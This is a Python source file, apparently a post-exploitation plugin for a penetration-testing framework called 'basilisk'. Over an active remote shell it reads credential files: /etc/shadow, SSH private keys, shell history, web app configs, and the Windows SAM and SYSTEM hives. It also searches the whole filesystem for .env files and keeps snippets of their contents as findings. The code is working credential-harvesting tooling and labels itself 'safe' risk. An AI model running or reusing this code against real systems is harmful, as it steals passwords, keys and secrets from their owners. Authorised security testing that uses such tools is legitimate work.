"""Credential harvesting â€” passwords from files, history, configs, SSH keys."""

from __future__ import annotations

import logging
from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

logger = logging.getLogger(__name__)

# Files to search for credentials
LINUX_CRED_FILES = [
    "/etc/shadow", "/etc/passwd", "/etc/krb5.keytab",
    "/root/.bash_history", "/root/.mysql_history",
    "/var/www/html/wp-config.php", "/var/www/html/.env",
    "/var/www/html/config.php", "/var/www/html/configuration.php",
    "/opt/*/.env", "/home/*/.bash_history", "/home/*/.ssh/id_rsa",
    "/home/*/.ssh/id_ecdsa", "/home/*/.ssh/id_ed25519",
    "/home/*/.gnupg/secring.gpg",
    "/var/lib/mysql/mysql/user.MYD",
    "/tmp/krb5cc_*",
]

WINDOWS_CRED_FILES = [
    r"C:\Users\*\AppData\Local\Microsoft\Credentials\*",
    r"C:\Users\*\Desktop\*.txt",
    r"C:\Users\*\Documents\*.txt",
    r"C:\Windows\repair\SAM", r"C:\Windows\repair\SYSTEM",
    r"C:\Windows\System32\config\SAM",
    r"C:\inetpub\wwwroot\web.config",
    r"C:\xampp\htdocs\*.config",
]


class CredentialHarvestPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="credential_harvest",
        display_name="Credential Harvesting",
        category=PluginCategory.POST_EXPLOIT,
        description="Extract passwords from files, history, configs, SSH keys",
        produces=["credentials"],
        timeout=60.0,
        requires_http=False,
        requires_shell=True,
        risk_level="safe",
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        findings: list[Finding] = []
        data: dict = {"credentials": [], "files": []}

        shells = ctx.state.get("active_shells", [])
        if not shells or not ctx.shell:
            return PluginResult.fail(
                self.meta.name, target.host, error="No shell session",
            )

        session = ctx.shell.get_session(shells[0]["id"]) if isinstance(shells[0], dict) else None
        if not session:
            return PluginResult.fail(
                self.meta.name, target.host, error="Shell session not found",
            )

        # Detect OS and choose file list
        from basilisk.utils.shell import ShellOS
        is_windows = session.os == ShellOS.WINDOWS
        cred_files = WINDOWS_CRED_FILES if is_windows else LINUX_CRED_FILES

        # Try to read each credential file
        for path in cred_files:
            if ctx.should_stop:
                break
            cmd = (
                f'type "{path}" 2>nul' if is_windows
                else f"cat {path} 2>/dev/null"
            )
            output = await ctx.shell.execute(session, cmd, timeout=5.0)
            if output and len(output.strip()) > 5:
                data["files"].append({"path": path, "size": len(output)})
                # Check for password patterns
                has_creds = any(
                    kw in output.lower()
                    for kw in ["password", "passwd", "secret", "key", "token"]
                )
                if has_creds or "shadow" in path or "SAM" in path:
                    findings.append(Finding.high(
                        f"Credentials found in {path}",
                        evidence=output[:300],
                        tags=["post-exploit", "credential"],
                    ))

        # Search for .env files
        if not is_windows:
            env_search = await ctx.shell.execute(
                session,
                "find / -name '.env' -type f 2>/dev/null | head -20",
                timeout=15.0,
            )
            if env_search:
                for env_file in env_search.strip().splitlines():
                    content = await ctx.shell.execute(
                        session, f"cat {env_file} 2>/dev/null", timeout=5.0,
                    )
                    if content and "=" in content:
                        data["files"].append({"path": env_file, "size": len(content)})
                        findings.append(Finding.high(
                            f"Environment file: {env_file}",
                            evidence=content[:300],
                            tags=["post-exploit", "credential", "env"],
                        ))

        if not findings:
            findings.append(Finding.info(
                "No readable credential files found", tags=["post-exploit"],
            ))

        return PluginResult.success(
            self.meta.name, target.host, findings=findings, data=data,
        )
